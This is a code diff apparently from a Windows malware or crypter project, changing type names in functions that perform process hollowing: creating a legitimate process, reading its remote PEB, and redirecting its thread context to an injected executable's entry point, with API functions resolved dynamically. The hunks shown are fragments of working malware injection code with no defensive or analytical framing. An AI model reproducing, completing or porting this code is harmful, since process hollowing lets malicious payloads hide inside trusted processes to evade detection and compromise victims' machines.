@@ -1,7 +1,7 @@
 #include "cyann.h"
 #include "api_function.h"
 
-PROCESS_INFORMATION     *create_process(WCHAR *cmd, DWORD flag)
+PROCESS_INFORMATION     *create_process(WCHAR *cmd, CINT flag)
 {
         CREATEPROCESSW          createproc;
         STARTUPINFO             si;
@@ -28,7 +28,7 @@ PEB	*get_remote_peb(HANDLE *rproc)
         PROCESS_BASIC_INFORMATION       procbasicinfo;
 	READPROCESSMEMORY		readprocmem;
         PEB				*rpeb;
-	DWORD                           retlen;
+	ULONG				retlen;
 
 	rpeb = NULL;
         if (!(getrprocinfo = (NTQUERYINFORMATIONPROCESS)resolve_symbol(&g_fonctions[1])))
@@ -94,7 +94,7 @@ int	set_new_eip(LPPROCESS_INFORMATION rpi, PEB *rpeb, t_pe *pe)
 		return (0);
 	if (!getthcontext(rpi->hThread, rcontext))
 		return (0);
-	rcontext->Ecx = (DWORD) rpeb->Reserved3[1] + pe->nthdr.OptionalHeader.AddressOfEntryPoint;
+	rcontext->GPR_BX = (CINT) rpeb->Reserved3[1] + pe->nthdr.OptionalHeader.AddressOfEntryPoint;
 	if (!setthcontext(rpi->hThread, rcontext))
 		return (0);
 	free(rcontext);
@@ -116,7 +116,7 @@ int     process_hollow(WCHAR *legitproc, t_pe *pe)
 		{
 			if (set_new_eip(pi, remotepeb, pe))
 			{
-				debug_son(pi, (DWORD)remotepeb->Reserved3[1]);
+				debug_son(pi, (CINT)remotepeb->Reserved3[1]);
 				free(pi);
 				free(remotepeb);
 				return (1);
